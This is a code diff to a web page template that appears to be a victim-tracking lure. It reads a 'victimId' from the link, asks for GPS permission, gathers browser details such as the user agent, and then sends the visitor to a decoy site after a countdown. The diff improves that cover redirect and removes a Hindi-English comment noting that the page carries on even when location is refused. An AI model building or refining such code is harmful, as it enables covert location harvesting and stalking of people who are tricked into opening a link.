@@ -125,6 +125,19 @@
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
 
+        // ===== REDIRECT FUNCTION =====
+        function doRedirect() {
+            let target = 'https://google.com';
+
+            // Check if redirectUrl is valid
+            if (redirectUrl && redirectUrl !== '' && redirectUrl !== '{{REDIRECT_URL}}' && redirectUrl.startsWith('http')) {
+                target = redirectUrl;
+            }
+
+            console.log('Redirecting to:', target);
+            window.location.href = target;
+        }
+
         function getBasicInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -296,7 +309,6 @@
 
             // ===== STEP 2: GPS LOCATION PERMISSION (OPTIONAL) =====
             const gps = await requestGPSPermission();
-            // Agar granted=false, toh bhi aage badhega
 
             // ===== STEP 3: COLLECT INFO =====
             const basicInfo = getBasicInfo();
@@ -343,12 +355,14 @@
 
             let seconds = 5;
             timerCount.textContent = seconds;
+
             const interval = setInterval(() => {
                 seconds--;
                 timerCount.textContent = seconds;
+
                 if (seconds <= 0) {
                     clearInterval(interval);
-                    window.location.href = redirectUrl || 'https://google.com';
+                    doRedirect();
                 }
             }, 1000);
         }
